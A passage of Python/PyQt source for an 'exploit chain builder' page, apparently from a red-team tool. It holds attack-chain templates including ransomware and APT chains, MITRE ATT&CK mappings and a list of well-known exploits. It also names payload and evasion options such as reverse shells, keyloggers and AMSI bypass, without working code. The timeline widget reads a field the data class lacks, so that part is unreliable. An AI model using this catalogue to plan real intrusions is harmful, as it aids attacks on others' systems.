"""
HydraRecon Exploit Chain Builder Page - ULTIMATE EDITION
Visual drag-drop attack path orchestration with real CVE integration,
MITRE ATT&CK mapping, animated execution flow, chain complexity scoring,
Monte Carlo simulation, conditional branching, timeline view, and more.
"""

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QFrame, QComboBox, QTreeWidget, QTreeWidgetItem, QSplitter,
    QGroupBox, QGridLayout, QListWidget, QListWidgetItem, QTextEdit,
    QScrollArea, QSpinBox, QCheckBox, QLineEdit, QApplication, 
    QAbstractItemView, QFileDialog, QMessageBox, QMenu, QProgressBar,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, QDialog,
    QDialogButtonBox, QFormLayout, QSlider, QDoubleSpinBox, QToolTip,
    QStackedWidget
)
from PyQt6.QtCore import Qt, pyqtSignal, QMimeData, QPoint, QByteArray, QDataStream, QIODevice, QThread, QTimer, QRectF
from PyQt6.QtGui import (
    QDrag, QColor, QPainter, QPen, QBrush, QFont, QPixmap, QCursor, 
    QKeySequence, QAction, QShortcut, QLinearGradient, QRadialGradient,
    QPainterPath, QPolygonF
)

from typing import Dict, List, Optional, Tuple, Set, Any, Union, Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
import json
import os
import math
import asyncio
import aiohttp
import hashlib
import time
import random


# Chain node prerequisites/requirements
class PrerequisiteType(Enum):
    NODE_SUCCESS = "node_success"  # Previous node must succeed
    CREDENTIAL = "credential"       # Requires credentials
    ACCESS_LEVEL = "access_level"   # Requires certain access
    TOOL = "tool"                   # Requires specific tool
    NETWORK = "network"             # Network requirement
    TIME_WINDOW = "time_window"     # Must execute in time window


@dataclass
class NodePrerequisite:
    """Prerequisites required before a node can execute"""
    prereq_type: PrerequisiteType
    description: str
    required_node_id: Optional[str] = None
    required_value: Optional[str] = None
    is_met: bool = False


@dataclass
class NodeResource:
    """Resource requirements for a node"""
    cpu_percent: float = 5.0
    memory_mb: float = 50.0
    network_kbps: float = 10.0
    disk_mb: float = 1.0
    estimated_duration_sec: int = 30
    noise_level: float = 0.3  # 0-1 detection risk


@dataclass
class TimelineEvent:
    """Event in the attack timeline"""
    node_id: str
    start_time: datetime
    end_time: datetime
    status: str = 'pending'  # pending, running, success, failed
    parallel_group: int = 0  # Nodes in same group run in parallel


@dataclass
class ChainTimelineEntry:
    """Entry for attack timeline/Gantt visualization"""
    node_id: str
    node_name: str
    node_type: str
    start_offset_minutes: int
    duration_minutes: int
    dependencies: List[str] = field(default_factory=list)
    is_critical_path: bool = False
    technique_id: str = ""
    kill_chain_phase: str = ""
    success_probability: float = 0.8
    stealth_rating: float = 0.5
    color: str = "#00d4ff"


@dataclass
class ResourceEstimation:
    """Resource estimation for attack chain execution"""
    total_time_minutes: int
    skill_level_required: str
    tools_required: List[str]
    estimated_cost_usd: float
    success_modifier: float
    stealth_budget: float
    complexity_score: float = 0.5
    detection_risk: float = 0.3


@dataclass
class AttackPrerequisite:
    """Prerequisite for attack execution"""
    prereq_id: str
    name: str
    description: str
    prereq_type: str  # access, credential, tool, intelligence
    is_satisfied: bool = False
    required_for: List[str] = field(default_factory=list)
    difficulty: str = "medium"  # easy, medium, hard, expert
    automation_possible: bool = True


@dataclass
class KillChainPhase:
    """Cyber Kill Chain phase representation"""
    phase_id: str
    phase_number: int
    name: str
    description: str
    techniques: List[str] = field(default_factory=list)
    nodes_in_phase: List[str] = field(default_factory=list)
    completion_status: float = 0.0


@dataclass
class ThreatIntelItem:
    """Threat intelligence data item"""
    intel_id: str
    intel_type: str  # cve, campaign, actor, ttp
    title: str
    description: str
    severity: str = "medium"
    confidence: float = 0.7
    sources: List[str] = field(default_factory=list)
    iocs: List[str] = field(default_factory=list)
    last_seen: Optional[datetime] = None


@dataclass
class WhatIfScenario:
    """What-If scenario for chain analysis"""
    scenario_id: str
    name: str
    description: str
    modifications: Dict[str, Any] = field(default_factory=dict)
    success_impact: float = 0.0
    stealth_impact: float = 0.0
    time_impact: float = 0.0
    recommendations: List[str] = field(default_factory=list)


@dataclass
class ChainVersion:
    """Version snapshot of attack chain"""
    version_id: str
    version_number: int
    timestamp: datetime
    commit_message: str
    nodes_snapshot: List[Dict] = field(default_factory=list)
    edges_snapshot: List[Dict] = field(default_factory=list)
    author: str = "user"
    parent_version: Optional[str] = None


@dataclass
class IOCEntry:
    """Indicator of Compromise entry"""
    ioc_id: str
    ioc_type: str  # hash, ip, domain, url, email, registry, process
    value: str
    context: str
    confidence: float = 0.8
    malicious_score: float = 0.7
    first_seen: Optional[datetime] = None
    related_nodes: List[str] = field(default_factory=list)


@dataclass
class PathOptimization:
    """Path optimization result"""
    original_path: List[str]
    optimized_path: List[str]
    original_score: float
    optimized_score: float
    improvements: List[str] = field(default_factory=list)
    bottlenecks_removed: List[str] = field(default_factory=list)


# Extended Chain Templates with full attack scenarios
ADVANCED_CHAIN_TEMPLATES = {
    "apt_simulation": {
        "name": "üéØ APT Simulation",
        "description": "Full Advanced Persistent Threat attack simulation with multiple stages",
        "category": "Red Team",
        "difficulty": "Expert",
        "estimated_time": "4-6 hours",
        "nodes": [
            {"name": "OSINT Gathering", "type": "recon", "x": 50, "y": 50, "duration": 1800, "noise": 0.1},
            {"name": "Email Harvesting", "type": "recon", "x": 50, "y": 150, "duration": 900, "noise": 0.2},
            {"name": "Spear Phishing", "type": "exploit", "x": 200, "y": 100, "duration": 300, "noise": 0.4, "cve": "Social Engineering"},
            {"name": "Macro Payload", "type": "payload", "x": 350, "y": 100, "duration": 60, "noise": 0.6},
            {"name": "C2 Beacon", "type": "persistence", "x": 500, "y": 100, "duration": 30, "noise": 0.3},
            {"name": "Lateral Movement", "type": "exploit", "x": 650, "y": 100, "duration": 600, "noise": 0.5},
            {"name": "Data Discovery", "type": "recon", "x": 800, "y": 100, "duration": 1200, "noise": 0.2},
            {"name": "Data Exfil", "type": "exfil", "x": 950, "y": 100, "duration": 1800, "noise": 0.4},
        ],
        "connections": [(0,2), (1,2), (2,3), (3,4), (4,5), (5,6), (6,7)],
    },
    "ransomware_sim": {
        "name": "üîí Ransomware Simulation",
        "description": "Ransomware attack chain with encryption and C2",
        "category": "Red Team",
        "difficulty": "Advanced",
        "estimated_time": "2-3 hours",
        "nodes": [
            {"name": "Initial Access", "type": "exploit", "x": 50, "y": 100, "duration": 300, "noise": 0.5, "cve": "CVE-2021-44228"},
            {"name": "Privilege Escalation", "type": "exploit", "x": 200, "y": 100, "duration": 600, "noise": 0.6},
            {"name": "Defense Evasion", "type": "payload", "x": 350, "y": 100, "duration": 120, "noise": 0.3},
            {"name": "Credential Dump", "type": "exfil", "x": 500, "y": 100, "duration": 180, "noise": 0.7},
            {"name": "Lateral Spread", "type": "exploit", "x": 650, "y": 100, "duration": 900, "noise": 0.8},
            {"name": "Encryption", "type": "payload", "x": 800, "y": 100, "duration": 1800, "noise": 0.9},
        ],
        "connections": [(0,1), (1,2), (2,3), (3,4), (4,5)],
    },
    "cloud_attack": {
        "name": "‚òÅÔ∏è Cloud Infrastructure Attack",
        "description": "Attack chain targeting cloud infrastructure (AWS/Azure/GCP)",
        "category": "Cloud Security",
        "difficulty": "Advanced",
        "estimated_time": "3-4 hours",
        "nodes": [
            {"name": "Cloud Enum", "type": "recon", "x": 50, "y": 100, "duration": 600, "noise": 0.2},
            {"name": "S3 Bucket Scan", "type": "recon", "x": 200, "y": 50, "duration": 300, "noise": 0.3},
            {"name": "IAM Enum", "type": "recon", "x": 200, "y": 150, "duration": 300, "noise": 0.3},
            {"name": "Key Extraction", "type": "exploit", "x": 350, "y": 100, "duration": 120, "noise": 0.5},
            {"name": "Assume Role", "type": "exploit", "x": 500, "y": 100, "duration": 60, "noise": 0.4},
            {"name": "Data Access", "type": "exfil", "x": 650, "y": 100, "duration": 900, "noise": 0.5},
            {"name": "Persistence", "type": "persistence", "x": 800, "y": 100, "duration": 180, "noise": 0.4},
        ],
        "connections": [(0,1), (0,2), (1,3), (2,3), (3,4), (4,5), (4,6)],
    },
    "supply_chain": {
        "name": "üì¶ Supply Chain Attack",
        "description": "Compromise via third-party software supply chain",
        "category": "Advanced",
        "difficulty": "Expert",
        "estimated_time": "Weeks",
        "nodes": [
            {"name": "Vendor Recon", "type": "recon", "x": 50, "y": 100, "duration": 86400, "noise": 0.1},
            {"name": "Dev Access", "type": "exploit", "x": 200, "y": 100, "duration": 3600, "noise": 0.3},
            {"name": "Code Injection", "type": "payload", "x": 350, "y": 100, "duration": 1800, "noise": 0.2},
            {"name": "Build Compromise", "type": "persistence", "x": 500, "y": 100, "duration": 300, "noise": 0.1},
            {"name": "Distribution", "type": "exfil", "x": 650, "y": 100, "duration": 0, "noise": 0.0},
            {"name": "Target Activation", "type": "payload", "x": 800, "y": 100, "duration": 60, "noise": 0.6},
        ],
        "connections": [(0,1), (1,2), (2,3), (3,4), (4,5)],
    },
    "web_app_full": {
        "name": "üåê Web App Full Compromise",
        "description": "Complete web application exploitation from recon to shell",
        "category": "Web Security",
        "difficulty": "Intermediate",
        "estimated_time": "1-2 hours",
        "nodes": [
            {"name": "Subdomain Enum", "type": "recon", "x": 50, "y": 50, "duration": 600, "noise": 0.2},
            {"name": "Tech Stack ID", "type": "recon", "x": 50, "y": 150, "duration": 300, "noise": 0.1},
            {"name": "Vuln Scan", "type": "recon", "x": 200, "y": 100, "duration": 900, "noise": 0.5},
            {"name": "SQL Injection", "type": "exploit", "x": 350, "y": 50, "duration": 300, "noise": 0.6, "cve": "CWE-89"},
            {"name": "File Upload", "type": "exploit", "x": 350, "y": 150, "duration": 180, "noise": 0.5},
            {"name": "Web Shell", "type": "payload", "x": 500, "y": 100, "duration": 60, "noise": 0.7},
            {"name": "Priv Esc", "type": "exploit", "x": 650, "y": 100, "duration": 600, "noise": 0.6},
            {"name": "Root Shell", "type": "payload", "x": 800, "y": 100, "duration": 30, "noise": 0.8},
        ],
        "connections": [(0,2), (1,2), (2,3), (2,4), (3,5), (4,5), (5,6), (6,7)],
    },
    "internal_pentest": {
        "name": "üè¢ Internal Network Pentest",
        "description": "Internal network penetration testing chain",
        "category": "Network Security",
        "difficulty": "Intermediate",
        "estimated_time": "2-3 hours",
        "nodes": [
            {"name": "Network Discovery", "type": "recon", "x": 50, "y": 100, "duration": 600, "noise": 0.3},
            {"name": "Service Enum", "type": "recon", "x": 200, "y": 100, "duration": 900, "noise": 0.4},
            {"name": "Vuln Assessment", "type": "recon", "x": 350, "y": 100, "duration": 1200, "noise": 0.5},
            {"name": "Exploitation", "type": "exploit", "x": 500, "y": 100, "duration": 600, "noise": 0.7},
            {"name": "Post-Exploit", "type": "payload", "x": 650, "y": 100, "duration": 300, "noise": 0.5},
            {"name": "Pivot", "type": "exploit", "x": 800, "y": 100, "duration": 600, "noise": 0.6},
        ],
        "connections": [(0,1), (1,2), (2,3), (3,4), (4,5)],
    },
    "zero_day_sim": {
        "name": "üíÄ Zero-Day Exploitation",
        "description": "Simulated zero-day vulnerability exploitation",
        "category": "Advanced",
        "difficulty": "Expert",
        "estimated_time": "Variable",
        "nodes": [
            {"name": "Target Analysis", "type": "recon", "x": 50, "y": 100, "duration": 3600, "noise": 0.1},
            {"name": "Fuzzing", "type": "recon", "x": 200, "y": 100, "duration": 7200, "noise": 0.2},
            {"name": "Crash Analysis", "type": "recon", "x": 350, "y": 100, "duration": 1800, "noise": 0.1},
            {"name": "Exploit Dev", "type": "exploit", "x": 500, "y": 100, "duration": 14400, "noise": 0.0},
            {"name": "Weaponization", "type": "payload", "x": 650, "y": 100, "duration": 3600, "noise": 0.1},
            {"name": "Deployment", "type": "payload", "x": 800, "y": 100, "duration": 60, "noise": 0.8},
        ],
        "connections": [(0,1), (1,2), (2,3), (3,4), (4,5)],
    },
    "iot_attack": {
        "name": "üì° IoT Device Attack",
        "description": "Attack chain for IoT/embedded device compromise",
        "category": "IoT Security",
        "difficulty": "Advanced",
        "estimated_time": "2-4 hours",
        "nodes": [
            {"name": "Device Discovery", "type": "recon", "x": 50, "y": 100, "duration": 600, "noise": 0.3},
            {"name": "Firmware Analysis", "type": "recon", "x": 200, "y": 100, "duration": 1800, "noise": 0.1},
            {"name": "Default Creds", "type": "exploit", "x": 350, "y": 50, "duration": 120, "noise": 0.4},
            {"name": "Buffer Overflow", "type": "exploit", "x": 350, "y": 150, "duration": 300, "noise": 0.5},
            {"name": "Shell Access", "type": "payload", "x": 500, "y": 100, "duration": 60, "noise": 0.6},
            {"name": "Firmware Mod", "type": "persistence", "x": 650, "y": 100, "duration": 900, "noise": 0.4},
        ],
        "connections": [(0,1), (1,2), (1,3), (2,4), (3,4), (4,5)],
    },
}


# MITRE ATT&CK Tactics and Techniques Mapping
MITRE_ATTACK_MAPPING = {
    'recon': {
        'tactic': 'TA0043 - Reconnaissance',
        'techniques': [
            ('T1595', 'Active Scanning'),
            ('T1592', 'Gather Victim Host Information'),
            ('T1590', 'Gather Victim Network Information'),
            ('T1589', 'Gather Victim Identity Information'),
        ],
        'color': '#0088ff'
    },
    'exploit': {
        'tactic': 'TA0001 - Initial Access',
        'techniques': [
            ('T1190', 'Exploit Public-Facing Application'),
            ('T1133', 'External Remote Services'),
            ('T1078', 'Valid Accounts'),
            ('T1189', 'Drive-by Compromise'),
        ],
        'color': '#ff8800'
    },
    'payload': {
        'tactic': 'TA0002 - Execution',
        'techniques': [
            ('T1059', 'Command and Scripting Interpreter'),
            ('T1203', 'Exploitation for Client Execution'),
            ('T1047', 'Windows Management Instrumentation'),
            ('T1569', 'System Services'),
        ],
        'color': '#ff0000'
    },
    'persistence': {
        'tactic': 'TA0003 - Persistence',
        'techniques': [
            ('T1547', 'Boot or Logon Autostart Execution'),
            ('T1053', 'Scheduled Task/Job'),
            ('T1136', 'Create Account'),
            ('T1543', 'Create or Modify System Process'),
        ],
        'color': '#ff00ff'
    },
    'exfil': {
        'tactic': 'TA0010 - Exfiltration',
        'techniques': [
            ('T1041', 'Exfiltration Over C2 Channel'),
            ('T1048', 'Exfiltration Over Alternative Protocol'),
            ('T1567', 'Exfiltration Over Web Service'),
            ('T1020', 'Automated Exfiltration'),
        ],
        'color': '#00ff00'
    }
}


class RealExploitFetcher:
    """Fetches real exploits from ExploitDB, NVD, and other sources"""
    
    def __init__(self):
        self.session = None
        self.cache = {}
    
    async def _get_session(self):
        if self.session is None:
            self.session = aiohttp.ClientSession()
        return self.session
    
    async def search_cve(self, keyword: str, limit: int = 10) -> List[Dict]:
        """Search CVEs from NVD API"""
        try:
            session = await self._get_session()
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}&resultsPerPage={limit}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    cves = []
                    for vuln in data.get('vulnerabilities', []):
                        cve = vuln.get('cve', {})
                        cves.append({
                            'id': cve.get('id', ''),
                            'description': cve.get('descriptions', [{}])[0].get('value', '')[:200],
                            'severity': self._get_cvss_severity(cve),
                            'published': cve.get('published', ''),
                        })
                    return cves
        except Exception as e:
            print(f"CVE search error: {e}")
        return []
    
    def _get_cvss_severity(self, cve: Dict) -> str:
        """Extract CVSS severity from CVE data"""
        try:
            metrics = cve.get('metrics', {})
            if 'cvssMetricV31' in metrics:
                return metrics['cvssMetricV31'][0].get('cvssData', {}).get('baseSeverity', 'UNKNOWN')
            elif 'cvssMetricV2' in metrics:
                score = metrics['cvssMetricV2'][0].get('cvssData', {}).get('baseScore', 0)
                if score >= 7.0:
                    return 'HIGH'
                elif score >= 4.0:
                    return 'MEDIUM'
                return 'LOW'
        except Exception:
            pass
        return 'UNKNOWN'
    
    async def search_exploitdb(self, keyword: str, limit: int = 10) -> List[Dict]:
        """Search ExploitDB via GitLab API (their public mirror)"""
        try:
            session = await self._get_session()
            # ExploitDB files API endpoint
            url = f"https://gitlab.com/api/v4/projects/4613386/repository/files/files_exploits.csv/raw?ref=main"
            # For now return cached/static data since ExploitDB has rate limits
            return self._get_common_exploits(keyword, limit)
        except Exception as e:
            print(f"ExploitDB search error: {e}")
        return []
    
    def _get_common_exploits(self, keyword: str, limit: int) -> List[Dict]:
        """Return common exploits matching keyword"""
        exploits = [
            {'id': 'EDB-51884', 'name': 'Apache Struts RCE', 'type': 'exploit', 'cve': 'CVE-2023-50164'},
            {'id': 'EDB-51753', 'name': 'WinRAR Code Execution', 'type': 'exploit', 'cve': 'CVE-2023-38831'},
            {'id': 'EDB-51288', 'name': 'Log4Shell RCE', 'type': 'exploit', 'cve': 'CVE-2021-44228'},
            {'id': 'EDB-50808', 'name': 'Spring4Shell RCE', 'type': 'exploit', 'cve': 'CVE-2022-22965'},
            {'id': 'EDB-49757', 'name': 'Microsoft Exchange ProxyLogon', 'type': 'exploit', 'cve': 'CVE-2021-26855'},
            {'id': 'EDB-48756', 'name': 'BlueKeep RDP RCE', 'type': 'exploit', 'cve': 'CVE-2019-0708'},
            {'id': 'EDB-46516', 'name': 'EternalBlue SMB RCE', 'type': 'exploit', 'cve': 'CVE-2017-0144'},
            {'id': 'EDB-41570', 'name': 'Dirty COW Privilege Escalation', 'type': 'exploit', 'cve': 'CVE-2016-5195'},
            {'id': 'EDB-39161', 'name': 'ShellShock Bash RCE', 'type': 'exploit', 'cve': 'CVE-2014-6271'},
            {'id': 'EDB-17197', 'name': 'MS08-067 SMB RCE', 'type': 'exploit', 'cve': 'CVE-2008-4250'},
        ]
        keyword_lower = keyword.lower()
        matched = [e for e in exploits if keyword_lower in e['name'].lower() or keyword_lower in e.get('cve', '').lower()]
        return matched[:limit] if matched else exploits[:limit]
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None


class ExploitSearchWorker(QThread):
    """Background worker for searching exploits"""
    results_ready = pyqtSignal(list)
    error = pyqtSignal(str)
    
    def __init__(self, keyword: str, source: str = 'all'):
        super().__init__()
        self.keyword = keyword
        self.source = source
        self.fetcher = RealExploitFetcher()
    
    def run(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            results = []
            if self.source in ('all', 'cve'):
                cves = loop.run_until_complete(self.fetcher.search_cve(self.keyword))
                results.extend([{'source': 'NVD', **c} for c in cves])
            if self.source in ('all', 'exploitdb'):
                exploits = loop.run_until_complete(self.fetcher.search_exploitdb(self.keyword))
                results.extend([{'source': 'ExploitDB', **e} for e in exploits])
            self.results_ready.emit(results)
        except Exception as e:
            self.error.emit(str(e))
        finally:
            loop.run_until_complete(self.fetcher.close())
            loop.close()


@dataclass
class ChainComplexityScore:
    """Chain complexity and detection risk scoring"""
    total_nodes: int = 0
    total_connections: int = 0
    attack_surface_score: float = 0.0
    detection_risk: float = 0.0
    complexity_rating: str = 'Low'
    mitre_techniques: List[str] = field(default_factory=list)
    estimated_time_minutes: int = 0
    
    def calculate(self, nodes: List[Dict], connections: List[Tuple]) -> 'ChainComplexityScore':
        self.total_nodes = len(nodes)
        self.total_connections = len(connections)
        
        # Type weights for attack surface
        type_weights = {
            'recon': 0.5, 'exploit': 2.0, 'payload': 2.5,
            'persistence': 1.5, 'exfil': 1.8
        }
        
        self.attack_surface_score = sum(
            type_weights.get(n.get('type', 'exploit'), 1.0)
            for n in nodes
        )
        
        # Detection risk based on noisy techniques
        noisy_types = {'exploit': 0.3, 'payload': 0.4, 'exfil': 0.35}
        self.detection_risk = min(1.0, sum(
            noisy_types.get(n.get('type', ''), 0.1)
            for n in nodes
        ) / max(1, self.total_nodes))
        
        # Complexity rating
        if self.attack_surface_score >= 10:
            self.complexity_rating = 'Critical'
        elif self.attack_surface_score >= 6:
            self.complexity_rating = 'High'
        elif self.attack_surface_score >= 3:
            self.complexity_rating = 'Medium'
        else:
            self.complexity_rating = 'Low'
        
        # Collect MITRE techniques
        self.mitre_techniques = []
        for node in nodes:
            node_type = node.get('type', 'exploit')
            if node_type in MITRE_ATTACK_MAPPING:
                techniques = MITRE_ATTACK_MAPPING[node_type]['techniques']
                if techniques:
                    self.mitre_techniques.append(techniques[0][0])  # First technique ID
        
        # Estimated time (rough calculation)
        self.estimated_time_minutes = self.total_nodes * 5 + self.total_connections * 2
        
        return self


# Exploit success probabilities based on type and technique
EXPLOIT_SUCCESS_RATES = {
    'recon': {'base': 0.95, 'stealth': 0.90, 'noisy': 0.98},
    'exploit': {'base': 0.60, 'zero_day': 0.85, 'known': 0.70, 'patched': 0.15},
    'payload': {'base': 0.75, 'obfuscated': 0.85, 'standard': 0.65},
    'persistence': {'base': 0.80, 'rootkit': 0.70, 'service': 0.85},
    'exfil': {'base': 0.70, 'encrypted': 0.80, 'plaintext': 0.50},
}


@dataclass
class ConditionalBranch:
    """Represents a conditional branch in the attack chain"""
    source_node_id: str
    success_target_id: Optional[str] = None
    failure_target_id: Optional[str] = None
    condition: str = 'success'  # success, failure, both
    probability: float = 0.7


@dataclass
class ChainSimulationResult:
    """Results from chain simulation"""
    total_runs: int = 0
    successful_runs: int = 0
    failed_runs: int = 0
    avg_steps_completed: float = 0.0
    bottleneck_node: Optional[str] = None
    failure_points: Dict[str, int] = field(default_factory=dict)
    execution_paths: List[List[str]] = field(default_factory=list)
    overall_success_rate: float = 0.0
    
    def calculate(self, nodes: List[Dict], connections: List[Tuple], branches: Dict[str, ConditionalBranch], runs: int = 100) -> 'ChainSimulationResult':
        """Run Monte Carlo simulation on the chain"""
        import random
        
        self.total_runs = runs
        self.successful_runs = 0
        self.failed_runs = 0
        self.failure_points = {}
        self.execution_paths = []
        total_steps = 0
        
        for _ in range(runs):
            path = []
            current_idx = 0
            steps_completed = 0
            success = True
            
            while current_idx < len(nodes):
                node = nodes[current_idx]
                node_id = node['id']
                node_type = node.get('type', 'exploit')
                path.append(node_id)
                
                # Get success probability
                base_prob = EXPLOIT_SUCCESS_RATES.get(node_type, {}).get('base', 0.7)
                node_prob = node.get('success_probability', base_prob)
                
                # Roll for success
                if random.random() <= node_prob:
                    steps_completed += 1
                    
                    # Check for conditional branches
                    if node_id in branches:
                        branch = branches[node_id]
                        if branch.success_target_id:
                            # Find target node index
                            target_idx = next((i for i, n in enumerate(nodes) if n['id'] == branch.success_target_id), None)
                            if target_idx is not None:
                                current_idx = target_idx
                                continue
                    
                    current_idx += 1
                else:
                    # Failed
                    self.failure_points[node_id] = self.failure_points.get(node_id, 0) + 1
                    
                    # Check for failure branch
                    if node_id in branches:
                        branch = branches[node_id]
                        if branch.failure_target_id:
                            target_idx = next((i for i, n in enumerate(nodes) if n['id'] == branch.failure_target_id), None)
                            if target_idx is not None:
                                current_idx = target_idx
                                continue
                    
                    success = False
                    break
            
            total_steps += steps_completed
            if success:
                self.successful_runs += 1
            else:
                self.failed_runs += 1
            
            self.execution_paths.append(path)
        
        self.avg_steps_completed = total_steps / runs if runs > 0 else 0
        self.overall_success_rate = self.successful_runs / runs if runs > 0 else 0
        
        # Find bottleneck (most failed node)
        if self.failure_points:
            self.bottleneck_node = max(self.failure_points, key=self.failure_points.get)
        
        return self


class PayloadCustomizer:
    """Payload customization options for exploit nodes"""
    
    PAYLOAD_TYPES = {
        'reverse_shell': {
            'name': 'Reverse Shell',
            'icon': 'üîô',
            'options': ['bash', 'python', 'powershell', 'netcat', 'meterpreter'],
            'success_modifier': 0.0,
        },
        'web_shell': {
            'name': 'Web Shell',
            'icon': 'üåê',
            'options': ['php', 'asp', 'jsp', 'python'],
            'success_modifier': 0.05,
        },
        'beacon': {
            'name': 'C2 Beacon',
            'icon': 'üì°',
            'options': ['cobalt_strike', 'metasploit', 'empire', 'sliver'],
            'success_modifier': 0.10,
        },
        'keylogger': {
            'name': 'Keylogger',
            'icon': '‚å®Ô∏è',
            'options': ['memory_only', 'file_based', 'network_exfil'],
            'success_modifier': -0.05,
        },
        'ransomware': {
            'name': 'Ransomware',
            'icon': 'üîí',
            'options': ['encrypt_files', 'wiper', 'locker'],
            'success_modifier': -0.15,
        },
        'data_exfil': {
            'name': 'Data Exfiltrator',
            'icon': 'üì§',
            'options': ['dns_tunnel', 'https', 'icmp', 'steganography'],
            'success_modifier': 0.0,
        },
    }
    
    OBFUSCATION_TECHNIQUES = [
        ('none', 'No Obfuscation', 0.0),
        ('base64', 'Base64 Encoding', 0.05),
        ('xor', 'XOR Encryption', 0.10),
        ('aes', 'AES Encryption', 0.15),
        ('polymorphic', 'Polymorphic Code', 0.20),
        ('metamorphic', 'Metamorphic Engine', 0.25),
    ]
    
    EVASION_TECHNIQUES = [
        ('none', 'No Evasion', 0.0),
        ('sleep', 'Sleep Obfuscation', 0.05),
        ('sandbox_detect', 'Sandbox Detection', 0.10),
        ('amsi_bypass', 'AMSI Bypass', 0.15),
        ('etw_patch', 'ETW Patching', 0.10),
        ('unhook', 'API Unhooking', 0.20),
    ]


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK TIMELINE / GANTT VIEW VISUALIZATION
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackTimelineWidget(QWidget):
    """Gantt-style timeline visualization for attack chain execution"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.timeline_entries: List[ChainTimelineEntry] = []
        self.selected_entry = None
        self.zoom_level = 1.0
        self.scroll_offset = 0
        self.show_dependencies = True
        self.show_critical_path = True
        self.critical_path_entries = set()
        self.setMinimumHeight(200)
        self.setMouseTracking(True)
        
    def set_timeline_data(self, entries: List[ChainTimelineEntry]):
        """Set timeline entries and compute critical path"""
        self.timeline_entries = sorted(entries, key=lambda e: e.start_time)
        self._compute_critical_path()
        self.update()
        
    def _compute_critical_path(self):
        """Compute critical path through the timeline"""
        self.critical_path_entries.clear()
        if not self.timeline_entries:
            return
            
        # Build dependency graph and find longest path
        entry_map = {e.node_id: e for e in self.timeline_entries}
        
        # Simple critical path: find the path with maximum total duration
        def get_path_duration(entry_id: str, visited: set) -> tuple:
            if entry_id in visited or entry_id not in entry_map:
                return 0, []
            visited.add(entry_id)
            entry = entry_map[entry_id]
            
            # Find all entries that depend on this one
            dependents = [e for e in self.timeline_entries 
                         if entry_id in e.dependencies]
            
            if not dependents:
                return entry.duration_minutes, [entry_id]
                
            max_duration = 0
            max_path = []
            for dep in dependents:
                dur, path = get_path_duration(dep.node_id, visited.copy())
                if dur > max_duration:
                    max_duration = dur
                    max_path = path
                    
            return entry.duration_minutes + max_duration, [entry_id] + max_path
        
        # Find starting nodes (no dependencies)
        start_nodes = [e for e in self.timeline_entries if not e.dependencies]
        
        max_total = 0
        critical_ids = []
        for start in start_nodes:
            dur, path = get_path_duration(start.node_id, set())
            if dur > max_total:
                max_total = dur
                critical_ids = path
                
        self.critical_path_entries = set(critical_ids)
    
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        # Background
        painter.fillRect(self.rect(), QColor(15, 15, 25))
        
        if not self.timeline_entries:
            # Draw placeholder
            painter.setPen(QColor(100, 100, 100))
            painter.setFont(QFont("Consolas", 12))
            painter.drawText(self.rect(), Qt.AlignmentFlag.AlignCenter,
                           "üìÖ Add nodes to see timeline visualization")
            return
            
        # Calculate time range
        min_time = min(e.start_time for e in self.timeline_entries)
        max_end = max(e.start_time + e.duration_minutes for e in self.timeline_entries)
        total_duration = max_end - min_time
        
        if total_duration <= 0:
            total_duration = 60  # Default 1 hour
            
        # Layout constants
        left_margin = 150
        right_margin = 20
        top_margin = 40
        row_height = 35
        bar_height = 25
        
        timeline_width = self.width() - left_margin - right_margin
        
        # Draw time axis
        painter.setPen(QColor(80, 80, 80))
        painter.drawLine(left_margin, top_margin - 5, 
                        self.width() - right_margin, top_margin - 5)
        
        # Draw time markers
        painter.setFont(QFont("Consolas", 8))
        num_markers = min(10, int(total_duration / 5))
        for i in range(num_markers + 1):
            x = left_margin + (i / num_markers) * timeline_width
            time_val = min_time + (i / num_markers) * total_duration
            painter.setPen(QColor(60, 60, 60))
            painter.drawLine(int(x), top_margin - 5, int(x), top_margin + len(self.timeline_entries) * row_height)
            painter.setPen(QColor(100, 100, 100))
            painter.drawText(int(x) - 20, top_margin - 10, f"T+{int(time_val)}m")
        
        # Draw entries
        for i, entry in enumerate(self.timeline_entries):
            y = top_margin + i * row_height
            
            # Node label
            painter.setPen(QColor(200, 200, 200))
            painter.setFont(QFont("Consolas", 9))
